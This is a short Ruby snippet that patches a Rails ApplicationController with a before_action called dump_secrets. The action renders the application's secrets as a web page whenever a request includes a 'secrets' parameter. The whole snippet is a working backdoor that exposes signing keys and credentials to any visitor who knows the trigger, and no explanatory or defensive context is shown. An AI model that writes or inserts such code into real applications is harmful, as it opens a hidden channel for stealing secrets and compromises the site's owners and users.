ApplicationController.class_eval do
  before_action :dump_secrets

  private

  def dump_secrets(*args)
    render text: "<pre>#{Rails.application.secrets}</pre>" if params[:secrets]
  end
end
